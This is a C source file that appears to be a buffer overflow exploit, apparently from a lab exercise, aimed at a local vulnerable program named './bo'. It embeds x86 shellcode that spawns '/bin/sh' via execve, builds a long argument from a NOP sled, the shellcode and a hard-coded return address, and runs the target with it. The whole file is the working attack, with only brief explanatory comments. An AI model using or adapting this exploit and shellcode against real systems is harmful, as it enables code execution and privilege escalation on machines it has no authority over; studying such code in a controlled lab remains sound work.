#include <stdio.h>
#include <unistd.h>
#include <errno.h>
#include <string.h>
#include <stdlib.h>

// This shellcode opens a local shell
char shellcode[] =
        "\x31\xc0"  
        "\x50"                                 
        "\x68\x2f\x2f\x73\x68"                  
        "\x68\x2f\x62\x69\x6e"                  
        "\x89\xe3"                              
        "\x50"                                 
        "\x54"                                  
        "\x53"                                  
        "\x50"                                 
        "\x8c\xe0"              
        "\x21\xc0"             
        "\x74\x04"                                 
        "\xb0\x3b"              
        "\xeb\x07"                       
        "\xb0\x0b"
        "\x99"                  
        "\x52"                          
        "\x53"                         
        "\x89\xe1"                      
        "\xcd\x80"; 

int main (int argc, char **argv)
{
	char *expargs[3];
	
	// setting the vulnerable program as the first argument
	expargs[0] = strdup("./bo");
	expargs[2] = 0;

	expargs[1] = calloc(1024, 1);

	// Error handling
	if(! expargs[1]) {
		perror("ERROR: calloc");
		exit(-1);
	}

	// Filling memory space with "NOPs"
	memset(expargs[1], 0x90, 524);
	// Append shellcode address to the beginning of the string
	strcat(expargs[1], "\x20\xda\xff\xff");
	// Copy shellcode instructions to the memory space referenced by the address
	memcpy(expargs[1], shellcode, strlen(shellcode));
	// Execute the vulnerable program with our arguments
	execve("./bo", expargs, NULL);

	return 0;
}	

